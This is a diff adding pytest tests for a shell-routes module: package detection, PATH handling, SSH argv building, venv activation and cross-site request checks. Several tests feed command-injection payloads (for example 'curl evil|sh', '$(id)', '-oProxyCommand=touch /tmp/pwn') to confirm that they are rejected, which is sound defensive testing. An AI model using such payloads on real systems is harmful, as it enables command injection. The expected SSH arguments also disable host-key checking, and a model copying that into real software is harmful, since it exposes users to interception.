@@ -3,14 +3,25 @@
 import builtins
 import importlib.util
 import json
+import os
 import sys
 from pathlib import Path
 from types import SimpleNamespace
+
+import pytest
 
 from routes.shell_routes import (
     _find_line_break,
     _running_in_container,
     _docker_row_status,
+    _package_installed_from_probe,
+    _package_pip_update_status,
+    _package_probe_script,
+    _package_status_note,
+    _prepend_user_install_bins_to_path,
+    _reject_cross_site,
+    _ssh_base_argv,
+    _venv_activate_prefix,
     DOCKER_IN_CONTAINER_HINT,
 )
 
@@ -182,3 +193,171 @@ class TestDockerRowStatus:
         assert "remote" in lowered
         assert "socket" in lowered
         assert "host-root" in lowered or "host root" in lowered
+
+
+class TestPackageProbeStatus:
+    """Dependency rows should reflect serve readiness, not import coincidences."""
+
+    def test_vllm_namespace_without_cli_is_not_installed(self):
+        probe = {
+            "modules": {
+                "vllm": {
+                    "found": True,
+                    "origin": None,
+                    "loader": None,
+                    "locations": ["/root/vllm"],
+                    "real_module": False,
+                }
+            },
+            "dists": {},
+            "binaries": {"vllm": None},
+        }
+
+        assert _package_installed_from_probe("vllm", probe) is False
+        assert "namespace" in _package_status_note("vllm", probe)
+        assert "no vLLM CLI" in _package_status_note("vllm", probe)
+
+    def test_vllm_requires_cli_for_current_serve_command(self):
+        probe = {
+            "modules": {"vllm": {"found": True, "real_module": True}},
+            "dists": {"vllm": "0.8.5"},
+            "binaries": {"vllm": "/home/user/venv/bin/vllm"},
+        }
+
+        assert _package_installed_from_probe("vllm", probe) is True
+        assert "python package: vllm 0.8.5" in _package_status_note("vllm", probe)
+        assert _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available is True
+
+    def test_vllm_cli_without_dist_is_external_for_update(self):
+        probe = {
+            "modules": {"vllm": {"found": False, "real_module": False}},
+            "dists": {},
+            "binaries": {"vllm": "/opt/vllm/bin/vllm"},
+        }
+
+        status = _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe)
+
+        assert _package_installed_from_probe("vllm", probe) is True
+        assert status.available is False
+        assert "outside Odysseus" in status.note
+
+    def test_llama_cpp_is_installed_when_native_llama_server_exists(self):
+        probe = {
+            "modules": {"llama_cpp": {"found": False, "real_module": False}},
+            "dists": {},
+            "binaries": {"llama-server": "/usr/local/bin/llama-server"},
+        }
+
+        assert _package_installed_from_probe("llama_cpp", probe) is True
+        assert "native llama-server" in _package_status_note("llama_cpp", probe)
+        status = _package_pip_update_status({"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe)
+        assert status.available is False
+        assert "package manager or source checkout" in status.note
+
+    def test_diffusers_requires_torch_too(self):
+        missing_torch = {
+            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": False}},
+            "dists": {"diffusers": "0.37.0"},
+            "binaries": {},
+        }
+        ready = {
+            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": True, "real_module": True}},
+            "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
+            "binaries": {},
+        }
+
+        assert _package_installed_from_probe("diffusers", missing_torch) is False
+        assert _package_installed_from_probe("diffusers", ready) is True
+
+    def test_local_user_install_bin_is_added_to_path(self, monkeypatch, tmp_path):
+        user_base = tmp_path / "user-base"
+        monkeypatch.setattr("site.USER_BASE", str(user_base))
+        monkeypatch.setenv("HOME", str(tmp_path / "home"))
+        monkeypatch.setenv("PATH", "/usr/bin")
+
+        _prepend_user_install_bins_to_path()
+
+        parts = os.environ["PATH"].split(os.pathsep)
+        assert str(user_base / "bin") in parts
+        assert str(tmp_path / "home" / ".local" / "bin") in parts
+
+    def test_remote_package_probe_checks_user_install_bin(self):
+        script = _package_probe_script(["vllm"])
+
+        assert "site.USER_BASE" in script
+        assert "os.path.expanduser('~/.local/bin')" in script
+        assert "add_user_install_bins_to_path()" in script
+        assert "shutil.which(b)" in script
+
+
+class TestSshBaseArgv:
+    def test_basic_host_no_port(self):
+        assert _ssh_base_argv("user@example.com", None) == [
+            "ssh", "-o", "ConnectTimeout=6", "-o", "StrictHostKeyChecking=no",
+            "user@example.com",
+        ]
+
+    def test_default_port_22_omitted(self):
+        assert "-p" not in _ssh_base_argv("h", "22")
+        assert "-p" not in _ssh_base_argv("h", "")
+        assert "-p" not in _ssh_base_argv("h", None)
+
+    def test_custom_port_added_as_separate_argv(self):
+        assert _ssh_base_argv("h", "2222")[-3:] == ["-p", "2222", "h"]
+
+    @pytest.mark.parametrize("bad", ["0", "70000", "-1", "8a", "$(id)", "22 22"])
+    def test_bad_port_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _ssh_base_argv("h", bad)
+
+    def test_option_injecting_host_rejected(self):
+        with pytest.raises(ValueError):
+            _ssh_base_argv("-oProxyCommand=touch /tmp/pwn", None)
+
+    @pytest.mark.parametrize("bad", ["", "   ", None])
+    def test_empty_host_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _ssh_base_argv(bad, None)
+
+
+class TestVenvActivatePrefix:
+    def test_empty_returns_blank(self):
+        assert _venv_activate_prefix(None) == ""
+        assert _venv_activate_prefix("") == ""
+
+    def test_appends_bin_activate(self):
+        assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "
+
+    def test_already_pointing_at_activate(self):
+        assert _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
+
+    @pytest.mark.parametrize("bad", [
+        "/opt/v && curl evil|sh",
+        "$(id)",
+        "`id`",
+        "v;id",
+        "v\nid",
+        "v|id",
+    ])
+    def test_injection_payloads_rejected(self, bad):
+        with pytest.raises(ValueError):
+            _venv_activate_prefix(bad)
+
+
+class TestRejectCrossSite:
+    @staticmethod
+    def _req(headers):
+        return SimpleNamespace(headers=headers)
+
+    def test_cross_site_rejected(self):
+        from fastapi import HTTPException
+        with pytest.raises(HTTPException) as exc:
+            _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
+        assert exc.value.status_code == 403
+
+    @pytest.mark.parametrize("site", ["same-origin", "same-site", "none"])
+    def test_same_origin_and_direct_nav_allowed(self, site):
+        assert _reject_cross_site(self._req({"sec-fetch-site": site})) is None
+
+    def test_missing_header_allowed(self):
+        assert _reject_cross_site(self._req({})) is None
